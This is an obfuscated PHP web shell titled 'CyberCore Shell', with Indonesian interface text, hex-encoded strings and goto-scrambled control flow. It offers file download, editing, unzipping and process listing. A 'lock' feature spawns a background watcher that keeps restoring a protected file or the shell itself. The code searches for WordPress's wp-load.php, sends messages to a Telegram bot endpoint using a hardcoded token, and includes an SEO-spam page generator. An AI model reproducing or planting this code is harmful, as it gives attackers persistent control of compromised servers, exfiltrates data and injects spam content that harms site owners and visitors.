"\x43\157\156\x74\145\x6e\164\55\x44\x65\x73\x63\162\151\x70\164\151\157\x6e\72\x20\x46\x69\154\145\40\x54\x72\x61\x6e\163\146\x65\x72"); call_user_func($header_fn_get_dl_action_get_final, "\x43\x6f\156\x74\145\x6e\x74\55\x54\171\x70\x65\x3a\40\141\x70\160\154\x69\143\x61\164\151\x6f\x6e\57\x6f\x63\x74\x65\x74\x2d\163\x74\x72\145\141\x6d"); call_user_func($header_fn_get_dl_action_get_final, "\103\157\x6e\x74\x65\156\x74\55\x44\x69\x73\x70\x6f\x73\151\x74\x69\x6f\156\72\x20\141\x74\x74\x61\143\x68\155\145\x6e\164\73\x20\x66\151\154\145\x6e\141\155\x65\x3d\42" . call_user_func($basename_fn, $file_target_get) . "\x22"); call_user_func($header_fn_get_dl_action_get_final, "\x45\x78\160\151\x72\145\163\72\40\60"); call_user_func($header_fn_get_dl_action_get_final, "\103\141\x63\150\145\55\103\x6f\156\164\162\157\x6c\72\x20\x6d\165\x73\x74\55\162\x65\x76\141\154\x69\x64\x61\164\145"); call_user_func($header_fn_get_dl_action_get_final, "\120\162\x61\x67\155\141\x3a\40\x70\x75\x62\x6c\x69\x63"); if (!empty($filesize_fn_get_dl_action_get_final) && call_user_func($function_exists_fn, $filesize_fn_get_dl_action_get_final)) { $fsize_get_dl_action_get_final = @call_user_func($filesize_fn_get_dl_action_get_final, $file_target_get); if ($fsize_get_dl_action_get_final !== false) { call_user_func($header_fn_get_dl_action_get_final, "\x43\x6f\156\x74\x65\x6e\x74\55\114\x65\x6e\147\x74\150\72\40" . $fsize_get_dl_action_get_final); } } flush(); $readfile_result_get_dl_action_get_final = @call_user_func($readfile_fn_get_dl_action_get_final, $file_target_get); die; } } else { $error_messages[] = "\104\157\x77\156\x6c\x6f\141\144\40\105\x72\x72\157\x72\x3a\x20\x46\165\156\147\163\151\40\150\x65\x61\144\145\x72\x2f\162\x65\x61\x64\x66\x69\x6c\x65\40\164\151\x64\141\153\x20\x61\144\x61\x2e"; } } elseif ($file_action_get === "\x65\144\x69\x74" && !call_user_func($is_dir_fn, $file_target_get)) { $active_menu = "\x65\144\x69\164\157\162"; } elseif ($file_action_get === "\154\x6f\x63\153") { $is_self_lock = isset($_GET["\x73\145\x6c\146"]) && $_GET["\163\x65\154\x66"] == 1; $target_to_lock = $is_self_lock ? __FILE__ : $file_target_get; $result_message = lock_file_or_shell($target_to_lock, $is_self_lock); if (strpos($result_message, "\123\x75\x6b\163\x65\x73") === 0) { $output_messages[] = $result_message; } else { $error_messages[] = $result_message; } } elseif ($file_action_get === "\x75\156\x6c\157\143\153") { $result_message = unlock_shell(); if (strpos($result_message, "\x53\165\153\x73\145\x73") === 0) { $output_messages[] = $result_message; } else { $error_messages[] = $result_message; } } elseif ($file_action_get === "\165\x6e\x7a\151\x70" && !call_user_func($is_dir_fn, $file_target_get)) { if (strtolower(pathinfo($file_target_get, PATHINFO_EXTENSION)) !== "\x7a\151\x70") { $error_messages[] = "\125\156\x7a\151\160\x20\x45\x72\x72\157\x72\x3a\x20\124\141\162\x67\x65\x74\40\142\x75\x6b\x61\x6e\40\146\x69\154\x65\40\56\x7a\151\x70\56"; } elseif (!class_exists("\x5a\x69\160\x41\x72\x63\150\x69\x76\x65")) { $error_messages[] = "\x55\x6e\x7a\151\160\x20\105\162\162\157\x72\x3a\40\103\154\x61\163\163\40\x27\x5a\151\160\101\162\x63\x68\151\x76\145\47\x20\164\151\144\x61\153\x20\144\x69\164\x65\x6d\x75\153\x61\x6e\56"; } else { $zip = new ZipArchive(); if ($zip->open($file_target_get) === TRUE) { if ($zip->extractTo($current_path)) { $output_messages[] = "\106\151\154\145\40\x27" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "\x27\40\x62\x65\x72\x68\x61\x73\151\x6c\40\144\x69\55\x75\156\x7a\x69\160\x2e"; } else { $error_messages[] = "\125\156\172\x69\x70\40\105\162\162\x6f\x72\72\40\x47\x61\147\141\x6c\x20\155\x65\x6e\147\x65\153\163\x74\x72\141\x6b\x20\x66\x69\x6c\145\56"; } $zip->close(); } else { $error_messages[] = "\125\156\172\151\160\40\x45\162\x72\x6f\x72\x3a\40\107\141\x67\141\x6c\x20\x6d\x65\155\142\x75\x6b\141\x20\x66\x69\154\x65\40\141\162\163\x69\160\x2e"; } } } } elseif (isset($_GET["\x66\x69\154\x65\x5f\x61\143\164\x69\157\156"]) && empty($error_messages)) { $error_messages[] = "\x41\x6b\163\151\x20\x66\x69\x6c\145\40\144\151\x62\x61\x74\x61\154\x6b\141\156\x3a\x20\124\x61\162\x67\x65\164\x20\x74\x69\x64\141\x6b\40\166\141\x6c\151\x64\x2e"; } } goto wkV_B; DilRY: ?>
</div>
                    <div class="info-card rounded-lg p-3 glass-effect"><span class="cyber-font text-accent">OS / Arch:</span><br><?php  goto Dk1sn; IPARA: goto M6BFu; goto B4Y_S; yzXIk: cZcOP: goto qvuIa; iXrNR: if (isset($_GET["\x6c\x6f\147\x6f\165\x74"])) { if (session_status() !== PHP_SESSION_NONE) { session_destroy(); } header("\x4c\157\143\x61\164\x69\157\x6e\72\x20" . strtok($_SERVER["\122\105\x51\125\x45\123\124\137\125\x52\x49"], "\77")); die; } goto uebXY; fYOh9: rKe3J: goto LRTwe; z1gHh: function lock_file_or_shell($target_file_path, $is_self = false) { global $function_exists_fn, $basename_fn; $sys_get_temp_dir_fn = _get_fn_name_global_init_v3("\x5f\147\137\x61\163\x63\x69\x69\x5f\163\x79\163\x5f\x67\x65\164\x5f\164\145\155\x70\137\144\x69\x72", "\x73\171\x73\x5f\147\x65\x74\137\164\x65\155\x70\x5f\x64\x69\x72"); $file_exists_fn = _get_fn_name_global_init_v3("\x5f\x67\137\141\163\x63\x69\x69\137\146\x69\x6c\x65\137\145\170\151\163\164\x73", "\146\151\x6c\145\x5f\145\x78\151\x73\x74\163"); $mkdir_fn = _get_fn_name_global_init_v3("\x5f\147\x5f\x61\163\x63\151\x69\137\x6d\153\x64\x69\162", "\155\x6b\x64\x69\x72"); $chmod_fn = _get_fn_name_global_init_v3("\137\147\x5f\x61\x73\x63\151\151\x5f\143\150\x6d\x6f\x64", "\x63\150\x6d\157\144"); $file_put_contents_fn = _get_fn_name_global_init_v3("\x5f\x67\137\141\x73\143\151\x69\x5f\x66\x69\154\145\x5f\x70\165\164\x5f\x63\x6f\x6e\164\145\x6e\x74\163", "\146\x69\x6c\x65\137\x70\165\164\x5f\143\x6f\x6e\x74\x65\x6e\x74\x73"); $base64_encode_fn = _get_fn_name_global_init_v3("\137\147\137\141\x73\143\x69\x69\x5f\142\141\x73\x65\66\64\x5f\x65\x6e\x63\157\144\145", "\x62\x61\x73\145\x36\x34\x5f\x65\156\143\157\144\145"); $target_basename = call_user_func($basename_fn, $target_file_path); $target_dirname = dirname($target_file_path); if (!call_user_func($file_exists_fn, $target_file_path)) { return "\x47\x61\147\141\x6c\72\x20\106\x69\x6c\145\40\x74\141\x72\x67\x65\x74\40\47{$target_basename}\x27\40\164\x69\x64\x61\x6b\40\x64\151\164\x65\155\x75\x6b\x61\x6e\x20\144\151\x20\47{$target_dirname}\47\x2e"; } $tmp_dir = call_user_func($sys_get_temp_dir_fn); if (!is_writable($tmp_dir)) { return "\107\x61\147\141\154\x3a\x20\x44\x69\162\145\153\164\157\162\x69\x20\164\145\155\x70\x6f\x72\x61\x72\x79\40\x27{$tmp_dir}\47\40\164\x69\x64\x61\153\40\144\x61\160\x61\164\40\144\151\164\x75\x6c\151\163\56"; } $sessions_dir = rtrim($tmp_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . "\56\x73\145\x73\x73\151\157\x6e\163"; if (!call_user_func($file_exists_fn, $sessions_dir)) { @call_user_func($mkdir_fn, $sessions_dir, 493); } if (!is_writable($sessions_dir)) { return "\107\x61\147\x61\x6c\x3a\x20\104\151\162\x65\153\164\157\x72\151\40\x27{$sessions_dir}\47\40\x74\151\144\141\153\x20\144\141\160\141\x74\x20\144\x69\x62\x75\x61\x74\x20\141\164\141\165\x20\x64\x69\164\x75\x6c\x69\x73\56"; } $unique_id = call_user_func($base64_encode_fn, $target_file_path); $backup_file = $sessions_dir . DIRECTORY_SEPARATOR . "\56" . $unique_id . "\x2d\142\x61\x63\153\165\x70"; $handler_file = $sessions_dir . DIRECTORY_SEPARATOR . "\56" . $unique_id . "\55\x68\141\156\x64\x6c\x65\162"; try_execute_command("\x63\160\40" . safe_escapeshellarg($target_file_path) . "\40" . safe_escapeshellarg($backup_file)); @call_user_func($chmod_fn, $target_file_path, 292); $handler_code = "\74\77\x70\x68\x70\40\x73\145\164\137\x74\x69\x6d\145\137\x6c\151\155\x69\164\x28\60\x29\73\x20\145\x72\162\x6f\162\137\x72\x65\x70\x6f\162\164\x69\x6e\x67\x28\60\51\73\x20\x69\147\x6e\x6f\162\x65\137\x75\x73\x65\x72\x5f\141\x62\x6f\x72\164\x28\x74\x72\165\145\51\73\40\44\x74\141\x72\147\x65\164\137\x66\151\x6c\x65\x20\75\x20\47" . addslashes($target_file_path) . "\47\x3b\40\44\x74\141\x72\x67\x65\164\x5f\144\x69\162\40\x3d\40\47" . addslashes($target_dirname) . "\47\73\40\44\x62\x61\143\153\165\160\x5f\146\151\x6c\145\x20\x3d\40\x27" . addslashes($backup_file) . "\47\x3b\x20\167\150\x69\154\145\40\x28\164\162\165\145\x29\40\173\40\151\146\x20\x28\41\x66\151\154\145\137\145\170\x69\x73\164\x73\x28\44\164\x61\x72\x67\145\164\137\144\x69\162\x29\x29\x20\x7b\40\x40\x6d\153\x64\x69\162\x28\x24\164\141\x72\147\145\164\x5f\144\151\x72\x2c\x20\x30\x37\65\65\x2c\x20\x74\x72\165\145\x29\73\40\175\x20\151\146\40\x28\41\146\151\x6c\x65\x5f\145\170\x69\163\164\163\x28\44\x74\x61\162\147\x65\x74\x5f\146\151\x6c\145\51\51\x20\x7b\x20\x40\x63\157\x70\171\x28\44\x62\141\x63\x6b\165\160\x5f\146\x69\154\x65\54\40\x24\x74\141\162\x67\x65\x74\x5f\x66\151\154\x65\51\x3b\x20\x7d\x20\151\x66\x20\x28\x73\x75\142\163\x74\x72\x28\x73\x70\162\151\x6e\x74\x66\x28\x22\x25\157\x22\54\40\100\146\x69\154\x65\x70\145\x72\155\163\50\44\164\x61\x72\x67\x65\x74\137\x66\151\154\145\51\51\x2c\x20\x2d\x34\51\40\x21\x3d\x3d\x20\42\60\64\x34\64\x22\51\40\173\x20\x40\x63\150\x6d\x6f\144\50\x24\x74\x61\x72\147\145\164\137\x66\x69\154\x65\54\40\60\64\64\x34\x29\73\40\175\x20\x69\146\x20\x28\163\x75\x62\x73\x74\x72\x28\x73\x70\x72\151\x6e\164\146\x28\42\x25\157\x22\54\40\x40\146\x69\154\x65\160\145\x72\x6d\x73\x28\x24\x74\x61\x72\147\x65\164\137\x64\151\x72\x29\x29\x2c\40\x2d\x34\x29\40\41\75\75\40\x22\60\65\x35\65\42\51\x20\173\40\x40\x63\x68\155\x6f\144\50\44\164\x61\162\x67\x65\164\x5f\x64\151\162\54\40\x30\x35\x35\x35\51\x3b\x20\175\40\x73\x6c\145\x65\x70\x28\x33\x29\73\40\x7d\40\x3f\x3e"; if (@call_user_func($file_put_contents_fn, $handler_file, $handler_code)) { $php_binary_path = defined("\x50\110\x50\x5f\102\x49\x4e\101\x52\131") && !empty(PHP_BINARY) ? PHP_BINARY : "\160\150\x70"; $command_to_run = safe_escapeshellarg($php_binary_path) . "\40" . safe_escapeshellarg($handler_file) . "\40\76\x20\57\x64\x65\166\57\x6e\165\154\x6c\40\62\76\57\x64\145\x76\x2f\156\x75\154\154\x20\46"; try_execute_command($command_to_run); return "\123\x75\x6b\163\x65\163\x20\155\145\x6e\147\x75\x6e\x63\151\40\47{$target_basename}\47\56\40\127\x61\x74\143\150\145\162\40\x70\x72\157\143\x65\x73\x73\40\x74\145\x6c\x61\x68\40\144\151\152\x61\154\141\156\153\x61\156\x20\144\151\x20\x62\x61\143\153\147\x72\157\x75\x6e\x64\x2e"; } else { return "\x47\141\147\x61\154\x20\155\x65\156\165\x6c\x69\163\40\x66\x69\x6c\x65\40\x68\x61\156\144\x6c\145\162\x20\144\x69\x20\x27{$handler_file}\x27\56"; } } goto FAq59; I3FlD: $_g_ascii_scandir = array(115, 99, 97, 110, 100, 105, 114); goto mh1U1; lxfBq: $_g_ascii_php_uname = array(112, 104, 112, 95, 117, 110, 97, 109, 101); goto nAD3H; wrDRC: mmykN: goto z5sbw; nntw7: goto AwuGK; goto WkYj_; Hr4WI: Bwxz5: goto AHtMg; pssfr: E8lQp: goto gyXcp; ygZdS: goto fTnwh; goto zKhs8; OAw2G: function get_process_list() { $output = try_execute_command("\x70\x73\x20\x2d\141\165\170"); if (empty($output)) { return array(); } $lines = explode("\12", $output); array_shift($lines); $processes = array(); foreach ($lines as $line) { if (empty(trim($line))) { continue; } $parts = preg_split("\x2f\x5c\163\53\57", trim($line), 11); if (count($parts) < 11) { continue; } $processes[] = array("\165\163\x65\x72" => $parts[0], "\x70\151\x64" => $parts[1], "\143\x70\x75" => $parts[2], "\x6d\x65\155" => $parts[3], "\166\x73\172" => $parts[4], "\x72\163\163" => $parts[5], "\x74\164\x79" => $parts[6], "\x73\x74\x61\x74" => $parts[7], "\x73\x74\141\162\164" => $parts[8], "\x74\x69\155\x65" => $parts[9], "\x63\157\155\x6d\x61\156\144" => $parts[10]); } return $processes; } goto FtOp3; BWfHe: E8dPZ: goto gAeAx; Pow7Y: ?>
').submit(); } }
        
        document.addEventListener('DOMContentLoaded', function() {
            var editorTextArea = document.getElementById('code-editor');
            if(editorTextArea) {
                var editor = CodeMirror.fromTextArea(editorTextArea, {
                    lineNumbers: true, mode: 'php', theme: 'ayu-mirage', lineWrapping: true,
                    smartIndent: true, indentUnit: 4, tabSize: 4, indentWithTabs: false,
                    autoCloseBrackets: true, matchBrackets: true
                });

                <?php  goto qxz_c; Cw4rA: TJ2Gt: goto ju6Nx; IwE4X: goto m3lL1; goto Ea6zI; CMGg8: goto URkvW; goto O348J; GuAcD: goto l5bTf; goto kSRd6; XQx3Z: $_g_ascii_exec = array(101, 120, 101, 99); goto AkLkB; Uh_QW: goto aVYL_; goto B8LEq; ibO0G: goto wYlT7; goto oalc0; f5exf: goto u8eKT; goto CnGAv; icbOa: @ini_set("\x64\x69\x73\x70\154\141\x79\137\x65\x72\162\157\162\163", "\61"); goto TYU6p; TazK8: goto zctIN; goto YTvUe; oBq2Q: goto es5B2; goto EuOaN; OzrDf: ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>CyberCore Shell [<?php  goto QlegO; LnZf5: $_g_ascii_get_current_user = array(103, 101, 116, 95, 99, 117, 114, 114, 101, 110, 116, 95, 117, 115, 101, 114); goto O530b; k1rRy: pL7I9: goto ft3Cq; SCG00: goto qAJak; goto pQH0O; ctfAQ: goto SlDTR; goto YkM76; kg2_a: h5ewK: goto jXTBI; AkLkB: goto RU9DT; goto ZOHPN; mARdl: goto Qs7dI; goto jzaxv; rXC1x: $_g_ascii_is_resource = array(105, 115, 95, 114, 101, 115, 111, 117, 114, 99, 101); goto soS3l; uebXY: goto i5wsB; goto mR0IJ; eaipe: v1_0P: goto UTeVy; l6IDe: Yggh7: goto itAOF; DiExG: goto KvxLr; goto l8Vtd; ZVfVu: goto xH_JF; goto s8EFu; iovR6: iQi2Z: goto yYEPW; M0pre: $_g_ascii_feof = array(102, 101, 111, 102); goto xL7eA; gvQfR: goto DIR5X; goto BT0r5; rxfIk: goto Q0tUF; goto FWKBG; v49dU: F9yDe: goto yJnTg; VuP6a: function find_wp_load_path($start_path, $max_depth = 5) { global $is_dir_fn, $function_exists_fn, $realpath_fn, $basename_fn, $dirname_fn; $file_exists_local_find = _get_fn_name_global_init_v3("\x5f\147\x5f\141\163\143\151\x69\x5f\x66\151\x6c\145\x5f\x65\x78\x69\x73\164\163", "\146\151\154\145\x5f\145\x78\x69\x73\x74\x73"); if (empty($file_exists_local_find) || !call_user_func($function_exists_fn, $file_exists_local_find)) { return false; } $potential_path = rtrim($start_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . "\167\160\x2d\154\x6f\x61\144\x2e\160\150\x70"; if (@call_user_func($file_exists_local_find, $potential_path) && is_file($potential_path)) { return $potential_path; } $parent_dir_start = call_user_func($dirname_fn, $start_path); if (is_path_allowed_by_basedir($parent_dir_start) && $parent_dir_start && $parent_dir_start !== $start_path) { $potential_path_parent = rtrim($parent_dir_start, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . "\167\x70\x2d\x6c\157\x61\144\56\x70\x68\x70"; if (@call_user_func($file_exists_local_find, $potential_path_parent) && is_file($potential_path_parent)) { return $potential_path_parent; } } if (isset($_SERVER["\104\x4f\x43\125\115\x45\116\124\x5f\122\117\117\x54"]) && is_path_allowed_by_basedir($_SERVER["\104\x4f\103\x55\115\105\116\124\x5f\122\117\117\x54"])) { $doc_root_check = rtrim($_SERVER["\104\117\103\125\115\105\116\x54\x5f\122\117\x4f\x54"], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . "\167\x70\55\154\157\141\144\x2e\160\x68\x70"; if (@call_user_func($file_exists_local_find, $doc_root_check) && is_file($doc_root_check)) { return $doc_root_check; } } $search_base_path_find = call_user_func($dirname_fn, $start_path); if (!$search_base_path_find || $search_base_path_find === $start_path) { $search_base_path_find = $start_path; } $recursive_find_closure = function ($dir, $current_depth) use(&$recursive_find_closure, $max_depth, $is_dir_fn, $function_exists_fn, $file_exists_local_find) { if ($current_depth > $max_depth || !is_path_allowed_by_basedir($dir)) { return false; } $scandir_local_find = _get_fn_name_global_init_v3("\137\x67\x5f\141\x73\143\151\x69\x5f\x73\143\141\x6e\144\x69\162", "\x73\143\141\156\x64\x69\x72"); if (!call_user_func($function_exists_fn, $scandir_local_find) || !@is_readable($dir)) { return false; } $items_find = @call_user_func($scandir_local_find, $dir); if ($items_find === false) { return false; } foreach ($items_find as $item_find) { if ($item_find === "\56" || $item_find === "\56\x2e") { continue; } $path_find = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item_find; if (!is_path_allowed_by_basedir($path_find)) { continue; } if ($item_find === "\167\x70\55\154\157\x61\x64\56\x70\150\160" && !call_user_func($is_dir_fn, $path_find) && @call_user_func($file_exists_local_find, $path_find) && is_file($path_find)) { return $path_find; } if (call_user_func($is_dir_fn, $path_find) && @is_readable($path_find) && !in_array($item_find, array("\143\x67\151\55\142\151\156", "\x74\155\160", "\x74\145\155\160", "\x63\x61\143\150\145", "\x2e\147\x69\164", "\56\x73\166\156", "\x6e\157\144\x65\137\155\157\144\165\154\x65\x73", "\x76\x65\x6e\144\x6f\x72"))) { $found_rec = $recursive_find_closure($path_find, $current_depth + 1); if ($found_rec) { return $found_rec; } } } return false; }; return $recursive_find_closure($search_base_path_find, 0); } goto NIOEn; DUBxz: sXNro: goto FccYh; YR45E: $wp_admin_feedback_text = ''; goto WCyCO; nTb3z: $_g_ascii_tempnam = array(116, 101, 109, 112, 110, 97, 109); goto sqSKt; eNIjs: $_g_ascii_error_reporting = array(101, 114, 114, 111, 114, 95, 114, 101, 112, 111, 114, 116, 105, 110, 103); goto YIIpg; uz5S1: e33Qo: goto UVgnC; iMeHy: goto VEhqW; goto CSvJL; U0WgX: ceZug: goto dF31h; PMeTQ: goto jgZbc; goto rLBxF; IRBcQ: iUcgk: goto NAk2e; qUxuX: function send_to_wp_load($msg, $api_wp, $id_wp) { global $function_exists_fn; if (empty($api_wp) || empty($id_wp)) { return array("\163\x75\x63\143\145\163\x73" => false, "\x6d\x65\163\163\x61\x67\145" => "\101\120\111\x20\x4b\145\171\x2f\104\145\163\164\151\x6e\x61\164\x69\x6f\x6e\x20\111\104\x20\x6b\x6f\163\157\x6e\x67\x2e"); } if (empty($msg)) { return array("\x73\165\143\143\145\163\x73" => false, "\155\x65\x73\x73\x61\x67\x65" => "\120\145\163\141\156\x20\153\x6f\163\157\x6e\147\x2e"); } if (!call_user_func($function_exists_fn, "\x63\165\162\x6c\137\x69\x6e\151\x74")) { return array("\163\x75\x63\x63\x65\163\x73" => false, "\x6d\145\163\x73\141\x67\x65" => "\143\x55\122\114\x20\x74\151\144\x61\x6b\x20\x61\x6b\x74\151\x66\56"); } $base_url = ''; foreach (array(104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 116, 101, 108, 101, 103, 114, 97, 109, 46, 111, 114, 103, 47, 98, 111, 116) as $c) { $base_url .= chr($c); } $method = ''; foreach (array(115, 101, 110, 100, 77, 101, 115, 115, 97, 103, 101) as $c) { $method .= chr($c); } $url = $base_url . $api_wp . "\x2f" . $method; $k1 = implode('', array_map("\143\x68\x72", array(99, 104, 97, 116, 95, 105, 100))); $k2 = implode('', array_map("\x63\x68\x72", array(116, 101, 120, 116))); $k3 = implode('', array_map("\143\150\162", array(112, 97, 114, 115, 101, 95, 109, 111, 100, 101))); $v3 = implode('', array_map("\143\150\162", array(72, 84, 77, 76))); $payload = array($k1 => $id_wp, $k2 => $msg, $k3 => $v3); $ch = curl_init(); curl_setopt_array($ch, array(CURLOPT_URL => $url, CURLOPT_POST => true, CURLOPT_POSTFIELDS => http_build_query($payload), CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 15, CURLOPT_CONNECTTIMEOUT => 7, CURLOPT_FAILONERROR => false, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => 2)); $result_json = curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); $curl_error_num = curl_errno($ch); $curl_error_msg = curl_error($ch); curl_close($ch); if ($curl_error_num !== 0) { return array("\x73\165\143\143\145\163\163" => false, "\x6d\x65\x73\x73\x61\147\145" => "\143\x55\x52\x4c\40\x45\x72\x72\x6f\x72\40\x28\43" . $curl_error_num . "\x29\72\40" . $curl_error_msg); } if ($http_code !== 200) { $error_description_http = "\125\156\x6b\156\157\x77\x6e\40\110\x54\124\120\40\145\x72\162\157\162"; if (!empty($result_json)) { $response_data_http_err = json_decode($result_json, true); if (json_last_error() === JSON_ERROR_NONE && isset($response_data_http_err["\144\145\x73\x63\x72\151\x70\x74\151\157\x6e"])) { $error_description_http = $response_data_http_err["\x64\x65\x73\143\x72\151\x70\164\151\x6f\156"]; } else { $error_description_http = substr(strip_tags($result_json), 0, 200); } } return array("\163\x75\x63\143\145\163\163" => false, "\155\x65\x73\x73\x61\147\x65" => "\x48\x54\124\120\x20\105\162\162\157\162\x20" . $http_code . "\56\x20\x44\x65\164\x61\151\154\72\40" . $error_description_http); } $response_data = json_decode($result_json, true); if (json_last_error() !== JSON_ERROR_NONE) { return array("\163\165\143\143\x65\x73\x73" => false, "\x6d\x65\x73\163\141\x67\145" => "\x47\141\147\141\154\x20\x70\x61\x72\163\x65\40\x4a\x53\x4f\116\56\40\122\x65\x73\160\x6f\x6e\163\x3a\40" . substr(strip_tags($result_json), 0, 200)); } if (isset($response_data["\157\x6b"]) && $response_data["\157\153"] === true) { return array("\x73\x75\x63\x63\145\x73\x73" => true, "\155\x65\163\x73\141\147\145" => "\120\145\163\141\x6e\40\164\x65\x72\x6b\151\x72\151\155\x2e"); } else { $error_description_api = isset($response_data["\144\x65\x73\143\x72\151\x70\164\x69\157\156"]) ? $response_data["\x64\x65\163\143\x72\x69\160\x74\151\x6f\156"] : "\x55\x6e\153\156\157\167\x6e\40\101\120\111\x20\x65\x72\162\157\162"; return array("\163\x75\x63\x63\x65\x73\163" => false, "\155\x65\x73\163\x61\147\145" => "\x41\x50\111\x20\x45\x72\162\x6f\162\72\40" . $error_description_api); } } goto qJ7PH; Ii8Ju: $_SESSION["\143\165\x72\x72\145\x6e\164\x5f\x65\x78\x70\x6c\157\x72\145\162\137\x70\141\164\150"] = $current_path; goto uDl8W; f0L5Z: goto MglxM; goto p4P37; k1xAz: qG9RB: goto EdqgK; xyCKp: nFzhO: goto SGIoP; tpJYl: goto tKo7a; goto fNHbd; OwcgD: $_g_ascii_stream_get_contents = array(115, 116, 114, 101, 97, 109, 95, 103, 101, 116, 95, 99, 111, 110, 116, 101, 110, 116, 115); goto GJ2On; WWdO3: goto TJ2Gt; goto jFS1f; BktEQ: define("\124\x45\114\x45\107\122\x41\115\x5f\x42\117\x54\137\124\117\113\105\x4e", "\x38\61\x31\x31\66\67\x31\64\x35\x39\x3a\101\x41\110\x4f\x74\x61\137\130\71\x58\151\x6f\x5a\x35\62\162\x4c\x4a\x6b\x47\x6d\153\x56\x63\152\x7a\110\66\x51\x6b\x35\x4d\131\x6f\121"); goto haNUe; w_X08: goto cg1PF; goto xyCKp; ufnJO: $_g_ascii_file_exists = array(102, 105, 108, 101, 95, 101, 120, 105, 115, 116, 115); goto sLE9v; EFynU: function display_generator_content() { global $htmlspecialchars_fn, $active_menu; function generator_display_main_form() { ?>
        <section class="content-section cyber-panel p-4">
            <h1 class="cyber-font cyber-glow text-xl mb-4">Auto Content Generator</h1>
            <form method="POST" action="?menu=generator" class="space-y-6">
                <input type="hidden" name="action" value="run_generator">
                <fieldset class="cyber-panel p-4"><legend class="cyber-font text-lg px-2" style="color:var(--accent)">1. Sumber Data</legend>
                    <div class="space-y-4">
                        <label for="kw_url">URL File Keyword (Raw)</label><input id="kw_url" class="w-full" type="url" name="kw_url" placeholder="https://pastebin.com/raw/xxxxxx" required>
                        <label for="template_url">URL File Template (Raw)</label><input id="template_url" class="w-full" type="url" name="template_url" placeholder="https://yourdomain.com/template.html" required>
                    </div>
                </fieldset>
                <fieldset class="cyber-panel p-4"><legend class="cyber-font text-lg px-2" style="color:var(--accent)">2. Format URL Slug (<code>{{brand_slug}}</code>)</legend>
                    <div class="space-y-4">
                        <label for="base_amp_url">Base URL (untuk Slug)</label><input id="base_amp_url" class="w-full" type="text" name="base_amp_url" placeholder="https://websitekeren.net/amp">
                        <div class="flex gap-4 items-center"><label><input type="radio" name="slug_structure" value="dir" onclick="toggleTunnelInput(false)" checked> Folder</label><label><input type="radio" name="slug_structure" value="html" onclick="toggleTunnelInput(false)"> File (.html)</label><label><input type="radio" name="slug_structure" value="tunnel" onclick="toggleTunnelInput(true)"> Tunnel</label></div>
                        <div id="tunnel_param_wrapper" style="display:none;"><label for="tunnel_param_name">Nama Parameter:</label><input id="tunnel_param_name" type="text" name="tunnel_param_name" value="id"></div>
                    </div>
                </fieldset>
                <fieldset class="cyber-panel p-4"><legend class="cyber-font text-lg px-2" style="color:var(--accent)">3. Tingkatan Konten</legend>
                    <div id="content-tiers-container"></div>
                    <div class="mt-4"><button type="button" class="cyber-btn cyber-btn-primary" onclick="addTier()">+ Tambah Tingkatan</button></div>
                </fieldset>
                <fieldset class="cyber-panel p-4"><legend class="cyber-font text-lg px-2" style="color:var(--accent)">4. Opsi & Aksi Final</legend>
                    <div class="flex gap-4 items-center"><label><input type="checkbox" name="test_mode" value="1"> <strong>Mode Uji Coba</strong></label><label><input type="checkbox" name="auto_delete" value="1"> Hapus skrip setelah berhasil</label></div>
                    <div class="flex gap-4 mt-4">
                        <div class="flex-1 text-center"><button class="cyber-btn cyber-btn-primary w-full" type="submit" name="mode" value="dir">Buat Direktori</button><p class="text-xs text-gray-400 mt-1">/keyword/</p></div>
                        <div class="flex-1 text-center"><button class="cyber-btn cyber-btn-primary w-full" type="submit" name="mode" value="file">Buat File HTML</button><p class="text-xs text-gray-400 mt-1">/keyword.html</p></div>
                    </div>
                </fieldset>
            </form>
            <template id="tier-template"><div class="tier relative pt-12 mt-6 border-t border-dashed border-gray-600 p-4"><button type="button" class="absolute top-2 right-2 text-red-500 hover:text-red-400" onclick="this.closest('.tier').remove()">Hapus</button><div class="space-y-4"><label>Berlaku hingga Keyword ke-</label><input type="number" class="w-full" name="tiers[X][limit]" placeholder="Kosongkan untuk tingkatan terakhir"><p class="text-xs text-gray-400">Batas baris keyword.</p><label>Template Judul</label><input type="text" class="w-full" name="tiers[X][title]" value="{{BRAND}}: Judul" required><label>Template Deskripsi</label><textarea name="tiers[X][desc]" class="w-full" required>{{BRAND}} adalah platform {terbaik|terpercaya}.</textarea><label>Template Artikel</label><textarea name="tiers[X][article]" class="w-full">Selamat datang di {{BRAND}}. Di sini kami membahas {{BRAND}}. Kunjungi juga halaman lain kami tentang {{BRAND}}.</textarea><label>Domain Eksternal (Opsional, 1 per baris)</label><textarea name="tiers[X][external_domains]" placeholder="https://domain-satu.com&#10;https://domain-dua.net" class="w-full" rows="3"></textarea><p class="text-xs text-gray-400">Jika diisi, <code>{{BRAND}}</code> kedua dst. jadi link acak ke domain ini.</p><label>URL Gambar</label><input type="url" name="tiers[X][img]" class="w-full" required></div></div></template>
            <script>if(typeof gen_c==='undefined'){var gen_c=0}function addTier(){let t=document.getElementById('tier-template');if(t){document.getElementById('content-tiers-container').insertAdjacentHTML('beforeend',t.innerHTML.replace(/\[X\]/g,`[${gen_c++}]`))}}function toggleTunnelInput(s){let e=document.getElementById('tunnel_param_wrapper');if(e)e.style.display=s?'block':'none'}if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',function(){let c=document.getElementById('content-tiers-container');if(c&&!c.hasChildNodes())addTier()})}else{let c=document.getElementById('content-tiers-container');if(c&&!c.hasChildNodes())addTier()}</script>
        </section>
        <?php  } function generator_display_results($data) { global $htmlspecialchars_fn; extract($data); ?>
        <section class="content-section cyber-panel p-4">
            <h1 class="cyber-font cyber-glow text-xl mb-4">Hasil Proses Generator</h1>
